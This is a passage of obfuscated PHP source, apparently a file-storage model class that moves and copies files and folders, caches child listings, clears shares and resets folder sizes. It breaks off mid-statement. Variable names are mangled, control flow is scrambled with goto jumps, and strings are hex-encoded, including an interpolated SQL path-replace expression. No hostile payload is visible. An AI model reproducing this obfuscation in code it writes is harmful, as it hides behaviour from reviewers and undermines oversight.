$bé‡Ù‘Á’Ê = $this->sourceInfoCache($dšº‹äéñ‹); $B²‘¹™Ÿ­ô = $this->sourceInfoCache($Cº“‡ÙÍ‡À); goto fäîÅÑŒÈ; D¸õÍö¸¡: $this->addAll($B„Šä©åêÏ, array(), !1); $cà¸‰Èêïª = $this->where(array($b¢‰óù«ÓŞ[457] => $A­¿Úôá¸“))->select(); $Dˆ¸Û—¤¢ï = $this->_childrenMakeRelation($aŸˆ‘˜¦, $cà¸‰Èêïª); goto fƒ“‰ßá¤œ; F®İ£ÓÖ¶±: $this->chunkEventSet($b¢‰óù«ÓŞ[511], array($b¢‰óù«ÓŞ[512], $Cõ¼²‘³øŞ, $D‚±Ğ« ÷)); $this->saveAll($D’ˆÓïµà); return $A­¿Úôá¸“; goto E‰÷éõòö“; fäîÅÑŒÈ: $Cõ¼²‘³øŞ = $this->_makeItemData($bé‡Ù‘Á’Ê, $B²‘¹™Ÿ­ô, $fÈ§¦š„ß©); Hook::trigger($b¢‰óù«ÓŞ[504], $Cõ¼²‘³øŞ); Hook::trigger($b¢‰óù«ÓŞ[505], array($b¢‰óù«ÓŞ[506], $Cõ¼²‘³øŞ, 0)); goto B”Å˜ÀŒ¤; E‰÷éõòö“: } private function _childrenMakeRelation($bÙœËäŠ¢ï, $d´„î‰„Ïœ) { $c¯ğ»äÑ‹Ü =& $_SERVER[¼]; $b„î—¯¹Äá = array(); $e‰õªáõá = array(); foreach ($bÙœËäŠ¢ï as $CÃï…ìÌ»º) { $cÌÇ°‘‹Í˜ = $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[28]] . $c¯ğ»äÑ‹Ü[8] . $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[455]]; $b„î—¯¹Äá[$cÌÇ°‘‹Í˜] = $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[366]]; } foreach ($d´„î‰„Ïœ as $CÃï…ìÌ»º) { $cÌÇ°‘‹Í˜ = $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[28]] . $c¯ğ»äÑ‹Ü[8] . $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[455]]; $dôõœ‰¹İÂ = $b„î—¯¹Äá[$cÌÇ°‘‹Í˜]; $e‰õªáõá[$dôõœ‰¹İÂ] = $CÃï…ìÌ»º[$c¯ğ»äÑ‹Ü[366]]; } return $e‰õªáõá; } private function _childrenMatch($Eéí„ŞÂ¬², $EÀá—Ë¯°¥, $D…™ó¹¬ÛÁ) { goto Bäªˆ¨Üƒ’; Bäªˆ¨Üƒ’: $B£†¶Û–ˆ… =& $_SERVER[¼]; $b ÜˆÉË = $D…™ó¹¬ÛÁ[$B£†¶Û–ˆ…[455]]; $aËÎ£Ç»¥­ = $this->parentLevelArray($EÀá—Ë¯°¥[$B£†¶Û–ˆ…[455]]); goto d¨ùíÎ»ö›; d¨ùíÎ»ö›: foreach ($aËÎ£Ç»¥­ as $c¸–“ê³èï) { if (isset($Eéí„ŞÂ¬²[$c¸–“ê³èï])) { $b ÜˆÉË .= $Eéí„ŞÂ¬²[$c¸–“ê³èï] . $B£†¶Û–ˆ…[513]; } } $b ÜˆÉË = rtrim($b ÜˆÉË, $B£†¶Û–ˆ…[47]) . $B£†¶Û–ˆ…[47]; $e”š×Ø˜Ü‰ = $this->parentLevelArray($b ÜˆÉË); goto cœëÁ¥™ØŒ; cœëÁ¥™ØŒ: $A°õù…™¡Ş = $e”š×Ø˜Ü‰[count($e”š×Ø˜Ü‰) - 1]; return array($B£†¶Û–ˆ…[457] => $A°õù…™¡Ş, $B£†¶Û–ˆ…[455] => $b ÜˆÉË); goto d—²Ğî«¡; d—²Ğî«¡: } private function _makeItemData($bÖø¯ÊÇ‚, $E‘Óò‰Øåî, $Bù‹ãêí°) { $bÈÂó©¨œ =& $_SERVER[¼]; $eÛ¶ô®àµ„ = array($bÈÂó©¨œ[514] => $bÖø¯ÊÇ‚[$bÈÂó©¨œ[367]], $bÈÂó©¨œ[383] => $Bù‹ãêí°, $bÈÂó©¨œ[515] => $bÖø¯ÊÇ‚[$bÈÂó©¨œ[369]], $bÈÂó©¨œ[416] => $bÖø¯ÊÇ‚[$bÈÂó©¨œ[415]], $bÈÂó©¨œ[516] => $bÖø¯ÊÇ‚[$bÈÂó©¨œ[77]], $bÈÂó©¨œ[517] => $E‘Óò‰Øåî[$bÈÂó©¨œ[368]], $bÈÂó©¨œ[518] => $E‘Óò‰Øåî[$bÈÂó©¨œ[452]], $bÈÂó©¨œ[519] => USER_ID, $bÈÂó©¨œ[520] => USER_ID, $bÈÂó©¨œ[365] => $E‘Óò‰Øåî[$bÈÂó©¨œ[366]], $bÈÂó©¨œ[521] => $E‘Óò‰Øåî[$bÈÂó©¨œ[455]] . $E‘Óò‰Øåî[$bÈÂó©¨œ[366]] . $bÈÂó©¨œ[47], $bÈÂó©¨œ[392] => 0, $bÈÂó©¨œ[522] => $bÈÂó©¨œ[33]); return $eÛ¶ô®àµ„; } private function _copyApplyMeta($aÓĞÌ×§”, &$c¢¹©ïµÕ) { $c­İ¿ª‚Õâ =& $_SERVER[¼]; $CŸàŞ‡‹Ç• = $aÓĞÌ×§”[$c­İ¿ª‚Õâ[366]]; $aÎËì±¡ÉÁ = $aÓĞÌ×§”[$c­İ¿ª‚Õâ[28]]; if (!isset($aÓĞÌ×§”[$c­İ¿ª‚Õâ[523]]) || !$aÓĞÌ×§”[$c­İ¿ª‚Õâ[523]] || $aÓĞÌ×§”[$c­İ¿ª‚Õâ[523]] == $c­İ¿ª‚Õâ[464]) { $c¢¹©ïµÕ[$c­İ¿ª‚Õâ[499]][] = array($c­İ¿ª‚Õâ[366], $CŸàŞ‡‹Ç•, $c­İ¿ª‚Õâ[523], short_id($CŸàŞ‡‹Ç•)); } if (Input::check($aÎËì±¡ÉÁ, $c­İ¿ª‚Õâ[524])) { $c¢¹©ïµÕ[$c­İ¿ª‚Õâ[498]][] = array($c­İ¿ª‚Õâ[366] => $CŸàŞ‡‹Ç•, $c­İ¿ª‚Õâ[89] => $c­İ¿ª‚Õâ[412], $c­İ¿ª‚Õâ[356] => str_replace($c­İ¿ª‚Õâ[50], $c­İ¿ª‚Õâ[33], Pinyin::encode($aÎËì±¡ÉÁ))); $c¢¹©ïµÕ[$c­İ¿ª‚Õâ[498]][] = array($c­İ¿ª‚Õâ[366] => $CŸàŞ‡‹Ç•, $c­İ¿ª‚Õâ[89] => $c­İ¿ª‚Õâ[411], $c­İ¿ª‚Õâ[356] => Pinyin::encode($aÎËì±¡ÉÁ, $c­İ¿ª‚Õâ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($e„Æà‹È¥) { goto CÉµ“«®ÎÏ; FÖ•†Ó·¶Î: $aÂ†’¯ŒÕ× = array($dÅªµ³Èùë[455] => array($dÅªµ³Èùë[479], $BŒËšöìº[$dÅªµ³Èùë[455]] . $e„Æà‹È¥ . $dÅªµ³Èùë[480]), $dÅªµ³Èùë[393] => $this->targetIsDelete); $EÙœ¿ºƒ«¦ = $this->field($FãÍÛ¿Öˆ)->where($aÂ†’¯ŒÕ×)->select(); if (!$EÙœ¿ºƒ«¦) { return; } goto d‘ƒœ£±ôÛ; CÉµ“«®ÎÏ: $dÅªµ³Èùë =& $_SERVER[¼]; $BŒËšöìº = $this->sourceInfo($e„Æà‹È¥); $FãÍÛ¿Öˆ = $dÅªµ³Èùë[526]; goto FÖ•†Ó·¶Î; d‘ƒœ£±ôÛ: $EÙœ¿ºƒ«¦ = array_to_keyvalue($EÙœ¿ºƒ«¦, $dÅªµ³Èùë[366]); foreach ($EÙœ¿ºƒ«¦ as $D½ë²ƒ‰ÔÉ) { $bĞ…¥Šæá = $D½ë²ƒ‰ÔÉ[$dÅªµ³Èùë[457]]; $e„Æà‹È¥ = $D½ë²ƒ‰ÔÉ[$dÅªµ³Èùë[366]]; if (!isset($this->_childrenListCache[$e„Æà‹È¥]) && $D½ë²ƒ‰ÔÉ[$dÅªµ³Èùë[367]] == $dÅªµ³Èùë[83]) { $this->_childrenListCache[$e„Æà‹È¥] = array(); } if (!isset($this->_childrenListCache[$bĞ…¥Šæá])) { $this->_childrenListCache[$bĞ…¥Šæá] = array(); } $this->_childrenListCache[$bĞ…¥Šæá][$e„Æà‹È¥] = $D½ë²ƒ‰ÔÉ; $this->_childrenItemCache[$e„Æà‹È¥] = $D½ë²ƒ‰ÔÉ; } goto c¨„¹Ç¨¯Æ; c¨„¹Ç¨¯Æ: } private function _childrenListAll($FäÌñçä¢, &$aÄ«Å­Æ) { $aœáùßÙ­¯ =& $_SERVER[¼]; if (!isset($this->_childrenListCache[$FäÌñçä¢])) { return; } $Dƒ¡ùÒ×Ø = $this->_childrenListCache[$FäÌñçä¢]; foreach ($Dƒ¡ùÒ×Ø as $Dš‹ÜÛ‹õ => $C¦èï…¡Ê) { $aÄ«Å­Æ[$Dš‹ÜÛ‹õ] = $C¦èï…¡Ê; if ($C¦èï…¡Ê[$aœáùßÙ­¯[367]] == $aœáùßÙ­¯[83]) { $this->_childrenListAll($Dš‹ÜÛ‹õ, $aÄ«Å­Æ); } } } private function sourceInfoCache($CîÙö×Î) { if (isset($this->_childrenItemCache[$CîÙö×Î])) { return $this->_childrenItemCache[$CîÙö×Î]; } return $this->sourceInfo($CîÙö×Î); } private function _childrenList($C¬Ğ›‡÷Ø) { if (isset($this->_childrenListCache[$C¬Ğ›‡÷Ø])) { return $this->_childrenListCache[$C¬Ğ›‡÷Ø]; } return $this->_childrenListSelect($C¬Ğ›‡÷Ø); } private function _childrenListSelect($eÅÃ«è–É) { goto C¤¸Í—åœ»; E¯ƒİÒ…Ó±: foreach ($E÷æ³Û˜ê as $eÅÃ«è–É => $F×‘ÖİŠé) { $this->_childrenItemCache[$eÅÃ«è–É] = $F×‘ÖİŠé; } return $E÷æ³Û˜ê; goto dÖÉíŞ“Õ; C¤¸Í—åœ»: $AØÄ³ŒÃ•˜ =& $_SERVER[¼]; $C„èÄƒ‹ç± = array($AØÄ³ŒÃ•˜[457] => $eÅÃ«è–É, $AØÄ³ŒÃ•˜[393] => $this->targetIsDelete); $EÒÚ§ˆïÖ“ = $this->where($C„èÄƒ‹ç±)->select(); goto C³Œ‚ù‹ŞÍ; C³Œ‚ù‹ŞÍ: $EÒÚ§ˆïÖ“ = $EÒÚ§ˆïÖ“ ? $EÒÚ§ˆïÖ“ : array(); $E÷æ³Û˜ê = array_to_keyvalue($EÒÚ§ˆïÖ“, $AØÄ³ŒÃ•˜[366]); $this->_childrenListCache[$eÅÃ«è–É] = $E÷æ³Û˜ê; goto E¯ƒİÒ…Ó±; dÖÉíŞ“Õ: } private function fileNameExistCache($CÕ„ˆ«îÏ, $E¿öÆˆïµ•) { $aè¦•†ßÁó =& $_SERVER[¼]; $E¿öÆˆïµ• = strtolower($E¿öÆˆïµ•); $BƒÕá£÷¿ç = $this->_childrenList($CÕ„ˆ«îÏ); foreach ($BƒÕá£÷¿ç as $EğíÄÚ«‹³) { if ($E¿öÆˆïµ• == strtolower($EğíÄÚ«‹³[$aè¦•†ßÁó[28]])) { return $EğíÄÚ«‹³[$aè¦•†ßÁó[366]]; } } return !1; } private function fileNameAutoCache($cÜò”–Ô‹ö, $aÒ«“ÜÒÇ‹, $FËÅ”‰“Û, $dçÉïÎšæÙ) { $eÑÇšÑïË =& $_SERVER[¼]; $D£¼Ü ¨× = $this->_childrenList($cÜò”–Ô‹ö); $e¼ï°Æ»Ø± = array_to_keyvalue($D£¼Ü ¨×, $eÑÇšÑïË[33], $eÑÇšÑïË[28]); return $this->fileNameAutoGet($e¼ï°Æ»Ø±, $aÒ«“ÜÒÇ‹, $FËÅ”‰“Û, $dçÉïÎšæÙ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($C…‚Ù¯”¹¹, $DÌÂ‚ìñîª, $bß‘¦ó†‹Š = REPEAT_REPLACE, $f™Ó‰ëÕ‘Š = '') { goto Dí‘Ê™È§; f…Ò„‘Û¸Ö: $c‡Ï¾»£Ñ‚ = array($eëŠŒä¤°[$cßµÙ¾Æù[457]], $DÌÂ‚ìñîª); if ($eëŠŒä¤°[$cßµÙ¾Æù[367]] == $cßµÙ¾Æù[83]) { $c‡Ï¾»£Ñ‚[] = $C…‚Ù¯”¹¹; } $this->updateModifyTime($c‡Ï¾»£Ñ‚); goto B”òƒ·÷ğÉ; D‹‡ö®¤¨ç: $D„ÈÈ›ïï = $this->pathInfoMore($C…‚Ù¯”¹¹); if ($this->isParentOf($C…‚Ù¯”¹¹, $DÌÂ‚ìñîª)) { return !1; } if (!$eëŠŒä¤° || !$F„ŸÍ–áÔÆ || $F„ŸÍ–áÔÆ[$cßµÙ¾Æù[367]] != $cßµÙ¾Æù[83]) { return !1; } goto D¨ùƒº”Ãô; B”òƒ·÷ğÉ: Model($cßµÙ¾Æù[501])->eventMove($C…‚Ù¯”¹¹, $eëŠŒä¤°[$cßµÙ¾Æù[457]], $DÌÂ‚ìñîª); Hook::trigger($cßµÙ¾Æù[528], $D„ÈÈ›ïï); return $f—à†Ã±î÷; goto aˆôì´Û; C¥°«ù²‡: $this->lockWriteEnd($DÌÂ‚ìñîª, $f°ÃñÂÙöÜ); $this->folderSizeReset($eëŠŒä¤°[$cßµÙ¾Æù[457]]); $this->folderSizeReset($DÌÂ‚ìñîª); goto f…Ò„‘Û¸Ö; aÊ¥È¯àÉİ: Model($cßµÙ¾Æù[164])->linkAdd($cº½†™ãº–[$cßµÙ¾Æù[497]]); if ($F÷“¬§•†Ì && $cº½†™ãº–[$cßµÙ¾Æù[529]]) { $this->removeNow($C…‚Ù¯”¹¹, !1); } $this->lockMoveEnd($C…‚Ù¯”¹¹); goto C¥°«ù²‡; Dí‘Ê™È§: $cßµÙ¾Æù =& $_SERVER[¼]; $eëŠŒä¤° = $this->sourceInfo($C…‚Ù¯”¹¹); $F„ŸÍ–áÔÆ = $this->sourceInfo($DÌÂ‚ìñîª); goto D‹‡ö®¤¨ç; F°ÎìŞ•Ï›: $cº½†™ãº– = array($cßµÙ¾Æù[497] => array(), $cßµÙ¾Æù[529] => !1); $this->clearShare($C…‚Ù¯”¹¹, $DÌÂ‚ìñîª); $F÷“¬§•†Ì = $this->fileNameExistCache($DÌÂ‚ìñîª, $eëŠŒä¤°[$cßµÙ¾Æù[28]]); goto f¬âÉÛä¶; D¨ùƒº”Ãô: Hook::trigger($cßµÙ¾Æù[527], $D„ÈÈ›ïï); $this->targetIsDelete = intval($eëŠŒä¤°[$cßµÙ¾Æù[393]]); if ($eëŠŒä¤°[$cßµÙ¾Æù[457]] == $DÌÂ‚ìñîª && $f™Ó‰ëÕ‘Š != $eëŠŒä¤°[$cßµÙ¾Æù[28]]) { $FÛ×Š¶á«· = $this->fileNameExist($DÌÂ‚ìñîª, $f™Ó‰ëÕ‘Š); if ($FÛ×Š¶á«· && $eëŠŒä¤°[$cßµÙ¾Æù[367]] == $cßµÙ¾Æù[464]) { goto c¯Å«å”„‡; cø‰×•–§¯: $this->removeNow($C…‚Ù¯”¹¹, !1); $this->folderSizeReset($DÌÂ‚ìñîª); Hook::trigger($cßµÙ¾Æù[528], $D„ÈÈ›ïï); goto Eàè¿Ù×; Eàè¿Ù×: return $FÛ×Š¶á«·; goto a¯°ÔÉÏô; c¯Å«å”„‡: $c˜¨¾²Ö†ñ = $this->sourceInfo($FÛ×Š¶á«·); $Aõ¬õ…•áÂ = $this->fileHistory($c˜¨¾²Ö†ñ, $eëŠŒä¤°[$cßµÙ¾Æù[415]], $eëŠŒä¤°[$cßµÙ¾Æù[77]]); if (!$Aõ¬õ…•áÂ) { Model($cßµÙ¾Æù[418])->remove($eëŠŒä¤°[$cßµÙ¾Æù[415]]); } goto cø‰×•–§¯; a¯°ÔÉÏô: } } goto dğçïÃè¨›; dğçïÃè¨›: $f°ÃñÂÙöÜ = $f™Ó‰ëÕ‘Š ? $f™Ó‰ëÕ‘Š : $eëŠŒä¤°[$cßµÙ¾Æù[28]]; $this->lockMoveStart($C…‚Ù¯”¹¹); $this->lockWriteStart($DÌÂ‚ìñîª, $f°ÃñÂÙöÜ); goto F°ÎìŞ•Ï›; f¬âÉÛä¶: $f—à†Ã±î÷ = $this->_move($C…‚Ù¯”¹¹, $DÌÂ‚ìñîª, $bß‘¦ó†‹Š, $cº½†™ãº–, $f™Ó‰ëÕ‘Š); $this->sourceCacheClear(); if ($eëŠŒä¤°[$cßµÙ¾Æù[367]] == $cßµÙ¾Æù[83] && $F÷“¬§•†Ì) { $this->folderSizeResetChildren($f—à†Ã±î÷); } goto aÊ¥È¯àÉİ; aˆôì´Û: } private function _move($F¢·ÄÁ…­·, $B’’–ÖÄÑÚ, $eÀôëÙê, &$E×ùšçùÊª, $CÜ­Ù‰á = '') { goto eÛ™İøœ; d›ëÑ«à‰Ü: $this->lockWriteStart($B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜); if (!$CŠŸ’à¹·¾) { return $this->_moveForce($F¢·ÄÁ…­·, $B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜); } $eÀñ•ÖÒğÅ = $CŠŸ’à¹·¾; goto aİöåî´÷ˆ; aİöåî´÷ˆ: $dëÜ¹±¢¬Œ = !1; if ($F…óçÏ†‰) { if ($eÀôëÙê == REPEAT_RENAME_FOLDER) { $E¸¬ÛÓÓ¦˜ = $this->fileNameAuto($B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜, $eÀôëÙê, $F…óçÏ†‰); $eÀñ•ÖÒğÅ = $this->_moveForce($F¢·ÄÁ…­·, $B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜); } else { if ($eÀôëÙê == REPEAT_RENAME_FOLDER) { $eÀôëÙê = REPEAT_RENAME; } $eÃâÏ¡Çë = $this->_childrenListSelect($F¢·ÄÁ…­·); foreach ($eÃâÏ¡Çë as $C¢ÚºÈ‘Ëˆ) { $this->_move($C¢ÚºÈ‘Ëˆ[$aºÕœŸÙ÷½[366]], $CŠŸ’à¹·¾, $eÀôëÙê, $E×ùšçùÊª); } $dëÜ¹±¢¬Œ = !0; } } else { if ($eÀôëÙê == REPEAT_SKIP) { $dëÜ¹±¢¬Œ = !0; } else { if ($eÀôëÙê == REPEAT_RENAME || $eÀôëÙê == REPEAT_RENAME_FOLDER) { $E¸¬ÛÓÓ¦˜ = $this->fileNameAuto($B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜, $eÀôëÙê, $F…óçÏ†‰); $eÀñ•ÖÒğÅ = $this->_moveForce($F¢·ÄÁ…­·, $B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜); } else { if ($eÀôëÙê == REPEAT_REPLACE) { $aÕ‘óß”å³ = $this->sourceInfoCache($CŠŸ’à¹·¾); $BßƒñÆ„ª = $this->fileHistory($aÕ‘óß”å³, $eÍÈ‰­†¯[$aºÕœŸÙ÷½[415]], $eÍÈ‰­†¯[$aºÕœŸÙ÷½[77]]); if ($BßƒñÆ„ª) { $E×ùšçùÊª[$aºÕœŸÙ÷½[497]][] = $eÍÈ‰­†¯[$aºÕœŸÙ÷½[415]]; } else { $dëÜ¹±¢¬Œ = !0; } } } } } if ($dëÜ¹±¢¬Œ && !$E×ùšçùÊª[$aºÕœŸÙ÷½[529]]) { $E×ùšçùÊª[$aºÕœŸÙ÷½[529]] = !0; } goto d¼äïã» ô; d¼äïã» ô: return $eÀñ•ÖÒğÅ; goto CìîÒ†ã„; eÛ™İøœ: $aºÕœŸÙ÷½ =& $_SERVER[¼]; $eÍÈ‰­†¯ = $this->sourceInfo($F¢·ÄÁ…­·); $F…óçÏ†‰ = $eÍÈ‰­†¯[$aºÕœŸÙ÷½[367]] == $aºÕœŸÙ÷½[83]; goto EÁ—¾Ø†‡; EÁ—¾Ø†‡: $E¸¬ÛÓÓ¦˜ = $CÜ­Ù‰á ? $CÜ­Ù‰á : $eÍÈ‰­†¯[$aºÕœŸÙ÷½[28]]; $CŠŸ’à¹·¾ = $this->fileNameExistCache($B’’–ÖÄÑÚ, $E¸¬ÛÓÓ¦˜); $this->lockMoveStart($F¢·ÄÁ…­·); goto d›ëÑ«à‰Ü; CìîÒ†ã„: } private function _moveForce($AÄŠä¡í­ê, $aÅä³“‡¨, $AÒ¦ÛöË¡) { goto CÉ÷™ÙÃ‡Ñ; Eîì×†ŠÄ: $cÁÌº”“áÊ = $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[367]] == $a’¦‚Œ§¼¦[83]; $BÄ»­ƒƒµ— = array($a’¦‚Œ§¼¦[365] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[366]], $a’¦‚Œ§¼¦[521] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[455]] . $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[366]] . $a’¦‚Œ§¼¦[47], $a’¦‚Œ§¼¦[517] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[368]], $a’¦‚Œ§¼¦[518] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[452]], $a’¦‚Œ§¼¦[520] => USER_ID, $a’¦‚Œ§¼¦[383] => $AÒ¦ÛöË¡); $BÆ¯Ğ‹­³« = $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[368]] == SourceModel::TYPE_GROUP && $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[368]] == SourceModel::TYPE_GROUP && $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[452]] == $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[452]]; goto cÓŞé°·õº; CÉ÷™ÙÃ‡Ñ: $a’¦‚Œ§¼¦ =& $_SERVER[¼]; $C±”÷ŠÕéš = $this->sourceInfo($AÄŠä¡í­ê); $f¢‘ÂªØïß = $this->sourceInfo($aÅä³“‡¨); goto Eîì×†ŠÄ; cÓŞé°·õº: if (!$BÆ¯Ğ‹­³«) { Model($a’¦‚Œ§¼¦[450])->authClear($AÄŠä¡í­ê); } $B­­È³Î´ = $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[393]] == $a’¦‚Œ§¼¦[83] && $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[393]] != $a’¦‚Œ§¼¦[83]; if ($B­­È³Î´) { $BÄ»­ƒƒµ—[$a’¦‚Œ§¼¦[392]] = 0; } goto bæ½­Õ†Éİ; bæ½­Õ†Éİ: if ($cÁÌº”“áÊ) { $fµ¦Ú©àŸ = array($a’¦‚Œ§¼¦[521] => array($a’¦‚Œ§¼¦[479], $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[455]] . $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[366]] . $a’¦‚Œ§¼¦[480])); $CÄ±é×„ = $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[455]] . $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[366]] . $a’¦‚Œ§¼¦[47]; $d·ö££óÍ‰ = $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[455]] . $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[366]] . $a’¦‚Œ§¼¦[47] . $C±”÷ŠÕéš[$a’¦‚Œ§¼¦[366]] . $a’¦‚Œ§¼¦[47]; $aÉ×³¡Äµæ = array($a’¦‚Œ§¼¦[521] => array($a’¦‚Œ§¼¦[530], "\x72\x65\160\x6c\x61\x63\145\x28\160\141\162\145\156\164\114\145\166\x65\x6c\x2c\47{$CÄ±é×„}\x27\x2c\47{$d·ö££óÍ‰}\x27\51"), $a’¦‚Œ§¼¦[517] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[368]], $a’¦‚Œ§¼¦[518] => $f¢‘ÂªØïß[$a’¦‚Œ§¼¦[452]]); if ($B­­È³Î´) { $aÉ×³¡Äµæ[$a’¦‚Œ§¼¦[392]] = 0; } $this->where($fµ¦Ú©àŸ)->data($aÉ×³¡Äµæ)->save(); } $this->where(array($a’¦‚Œ§¼¦[380] => $AÄŠä¡í­ê))->data($BÄ»­ƒƒµ—)->save(); return $AÄŠä¡í­ê; goto E—ÇŠ¦³; E—ÇŠ¦³: } private function clearShare($bƒŒ²‰Û¦Ê, $FÃ¨èĞË‡¿) { goto dŒ«ƒ°Ñ; dŒ«ƒ°Ñ: $cï¹‘‚š“Ø =& $_SERVER[¼]; $EŸ–ñ¯”„Å = $this->sourceInfo($bƒŒ²‰Û¦Ê); $C™µñÈµá = $this->sourceInfo($FÃ¨èĞË‡¿); goto e¹¢—¬ËÊ×; fÛ˜ˆ°Ó ¥: if (!$F¹£ïÆ©é„) { return; } $F¹£ïÆ©é„ = array_to_keyvalue($F¹£ïÆ©é„, $cï¹‘‚š“Ø[33], $cï¹‘‚š“Ø[437]); $d×ùß·å¡³ = array($cï¹‘‚š“Ø[437] => array($cï¹‘‚š“Ø[7], $F¹£ïÆ©é„)); goto cÕ¶§ÔßŒº; bØŒÃ·¸å: if (!$Eµ«µİëÃ) { return; } $d×ùß·å¡³ = array($cï¹‘‚š“Ø[366] => array($cï¹‘‚š“Ø[7], $Eµ«µİëÃ), $cï¹‘‚š“Ø[444] => 1); $F¹£ïÆ©é„ = Model($cï¹‘‚š“Ø[532])->field($cï¹‘‚š“Ø[437])->where($d×ùß·å¡³)->select(); goto fÛ˜ˆ°Ó ¥; e¹¢—¬ËÊ×: if ($EŸ–ñ¯”„Å[$cï¹‘‚š“Ø[452]] == $C™µñÈµá[$cï¹‘‚š“Ø[452]] && $EŸ–ñ¯”„Å[$cï¹‘‚š“Ø[368]] == $cï¹‘‚š“Ø[531]) { return; } $d×ùß·å¡³ = array($cï¹‘‚š“Ø[455] => array($cï¹‘‚š“Ø[479], $EŸ–ñ¯”„Å[$cï¹‘‚š“Ø[455]] . $bƒŒ²‰Û¦Ê . $cï¹‘‚š“Ø[480])); $Eµ«µİëÃ = $this->field($cï¹‘‚š“Ø[380])->where($d×ùß·å¡³)->getField($cï¹‘‚š“Ø[366], !0); goto bØŒÃ·¸å; cÕ¶§ÔßŒº: Model($cï¹‘‚š“Ø[532])->where($d×ùß·å¡³)->save(array($cï¹‘‚š“Ø[444] => 0)); Model($cï¹‘‚š“Ø[533])->where($d×ùß·å¡³)->delete(); goto AÏ³¨È‚ä±; AÏ³¨È‚ä±: } public function copyFolderFromIO($EÕÂê‡êµÌ, $FöÉêŞ·‰ë, $F£™øàš, $C„ñ±ì‘­Œ, $E¼’»°‡óŞ, $DÓ„ĞöªÍ = false) { goto Cß“á‹º²; eˆ…¥°ì„‘: if ($DŞØÂÛ¢Ô‹) { $this->_childrenAllMake($DŞØÂÛ¢Ô‹); } Hook::trigger($F„â‹™Ô‡¨[535]); $this->_copyChildTo($EÕÂê‡êµÌ, $FöÉêŞ·‰ë, $bÃíÍÔÇğÍ, $C„ñ±ì‘­Œ, $CÊ¡Ÿá, $E¼’»°‡óŞ); goto A½ß‚›É; bŞª¶Œ½á: $DŞØÂÛ¢Ô‹ = $this->fileNameExist($F£™øàš, $d±ÁÆ¾‚ ); $bÃíÍÔÇğÍ = $this->mkdir($F£™øàš, $d±ÁÆ¾‚ , $C„ñ±ì‘­Œ); if (!$DŞØÂÛ¢Ô‹ || $C„ñ±ì‘­Œ == REPEAT_RENAME_FOLDER) { $C„ñ±ì‘­Œ = !1; } goto eˆ…¥°ì„‘; A½ß‚›É: Hook::trigger($F„â‹™Ô‡¨[536]); if ($bÃíÍÔÇğÍ) { $this->folderSizeResetChildren($bÃíÍÔÇğÍ); } $this->_childrenListClear(); goto C±ìó²¼ìî; BÊáÁ¡¦õ…: $this->updateModifyTime($F£™øàš); return $bÃíÍÔÇğÍ; goto D•ø¿Ì‚í¤; C±ìó²¼ìî: Model($F„â‹™Ô‡¨[500])->addAll($CÊ¡Ÿá[$F„â‹™Ô‡¨[498]], array(), !0); Model($F„â‹™Ô‡¨[501])->eventCopy($bÃíÍÔÇğÍ); $this->saveAll($CÊ¡Ÿá[$F„â‹™Ô‡¨[499]]); goto D®ÜŠòÀ”‡; Cß“á‹º²: $F„â‹™Ô‡¨ =& $_SERVER[¼]; $CÊ¡Ÿá = array($F„â‹™Ô‡¨[498] => array(), $F„â‹™Ô‡¨[499] => array(), $F„â‹™Ô‡¨[497] => array(), $F„â‹™Ô‡¨[534] => array()); $d±ÁÆ¾‚  = $DÓ„ĞöªÍ ? $DÓ„ĞöªÍ : $EÕÂê‡êµÌ->getPathName($EÕÂê‡êµÌ->pathThis($FöÉêŞ·‰ë)); goto bŞª¶Œ½á; D®ÜŠòÀ”‡: Model($F„â‹™Ô‡¨[418])->linkAdd($CÊ¡Ÿá[$F„â‹™Ô‡¨[497]]); Model($F„â‹™Ô‡¨[418])->remove($CÊ¡Ÿá[$F„â‹™Ô‡¨[534]]); $this->folderSizeReset($F£™øàš); goto BÊáÁ¡¦õ…; D•ø¿Ì‚í¤: } private function _copyChildTo($aÁÁ…¶¥“, $CâÕ¼¤îë, $DĞÚïğé‹, $CÆ¤à½»¼•, &$aÃ˜ìÊ·Â, $BÊõùñîæ) { goto eì»¨ª¡ŒÈ; aÕƒÚÀåÒ: $Eïäæ•Ù’Š = array_merge($CŒ†¾£ÒÑ·[$dâš¢ñáÒÙ[73]], $CŒ†¾£ÒÑ·[$dâš¢ñáÒÙ[74]]); $a¥ò‹æµ§ = $this->_addFiles($aÁÁ…¶¥“, $CŒ†¾£ÒÑ·[$dâš¢ñáÒÙ[73]], $BÊõùñîæ); $EÂ¹›ô’İ» = array(); goto b¹¶Ñ¾±´; b¹¶Ñ¾±´: foreach ($Eïäæ•Ù’Š as &$AÂ’•™éÁŒ) { goto d‚Ã“î±â°; d‚Ã“î±â°: if 